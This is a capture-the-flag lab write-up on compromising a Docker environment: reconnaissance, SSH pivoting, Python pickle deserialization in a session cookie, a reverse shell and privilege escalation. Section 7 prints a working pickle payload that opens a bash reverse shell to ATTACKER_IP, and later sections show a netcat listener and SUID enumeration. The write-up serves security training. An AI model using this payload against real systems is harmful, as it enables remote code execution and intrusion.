Recon
Initial Access
Container Discovery
Lateral Movement
Insecure Deserialization
Reverse Shell
Privilege Escalation
Flags

# Docker Escape & Insecure Deserialization Lab

## Overview

This lab demonstrates a multi-stage compromise involving:

* Web exploitation
* Docker container access
* Internal network enumeration
* SSH tunneling
* Insecure deserialization (Python Pickle)
* Reverse shell
* Privilege escalation

The objective was to obtain two flags from the target environment.

---

# 1. Reconnaissance

After gaining initial access to the system, network enumeration was performed to discover internal services.

```
nmap -Pn 192.168.10.0/24
```

Result:

```
Nmap scan report for 192.168.10.1
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  ssh
5000/tcp open  http
```

Port **2222** exposed an SSH service used for container access.

---

# 2. Initial Access (SSH)

Login was possible using the discovered credentials.

```
ssh root@TARGET_IP -p 2222
```

After authentication, a shell was obtained.

Checking the hostname revealed the system was actually a **Docker container**:

```
hostname
```

Output:

```
f5eb774507f2
```

This format corresponds to a **Docker container ID**, indicating the attacker was inside a containerized environment.

---

# 3. Container Enumeration

Network interfaces revealed another internal network.

```
ip a
```

Output:

```
inet 192.168.100.10/24
```

Routing table:

```
ip route
```

```
default via 192.168.100.1 dev eth0
```

This suggested the presence of other internal services.

---

# 4. Internal Network Discovery

An internal scan identified another host:

```
192.168.100.12:5000
```

This service was **not accessible externally**, requiring port forwarding.

---

# 5. SSH Port Forwarding

An SSH tunnel was created to access the internal service.

```
ssh -L 5000:192.168.100.12:5000 root@TARGET_IP -p 2222
```

This allowed the internal service to be accessed locally:

```
http://127.0.0.1:5000
```

---

# 6. Web Application Analysis

The application used a **session cookie** containing serialized data:

```
80049526000000000000007d94288c0475736572948c056664736466948c07726576656e7565948c05383530303094752e
```

The format indicated **Python Pickle serialization**.

Decoded structure:

```python
{
 "user": "fdsdf",
 "revenue": "85000"
}
```

This suggested a classic **insecure deserialization vulnerability**.

---

# 7. Exploiting Pickle Deserialization

A malicious pickle payload was generated to execute commands on the server.

Example payload concept:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",))

payload = pickle.dumps(Exploit())
print(payload.hex())
```

The payload was injected into the session cookie.

---

# 8. Reverse Shell

A listener was started on the attack machine:

```
nc -lvnp 4444
```

After sending the malicious cookie, the server executed the payload and connected back to the attacker, providing a reverse shell.

---

# 9. Post Exploitation

Once a shell was obtained, standard enumeration was performed.

Examples:

```
sudo -l
find / -perm -4000 2>/dev/null
```

This led to a **privilege escalation vector** allowing root access.

---

# 10. Flags

### User Flag

Obtained after the reverse shell access.

```
/home/user/flag.txt
```

---

### Root Flag

After privilege escalation:

```
/root/root.txt
```

---

# Key Takeaways

This lab demonstrates several important penetration testing concepts:

* Docker container identification
* Internal network enumeration
* SSH tunneling for pivoting
* Python Pickle insecure deserialization
* Reverse shell exploitation
* Privilege escalation techniques

---

# Skills Practiced

* Network enumeration
* SSH pivoting
* Web exploitation
* Deserialization attacks
* Linux privilege escalation
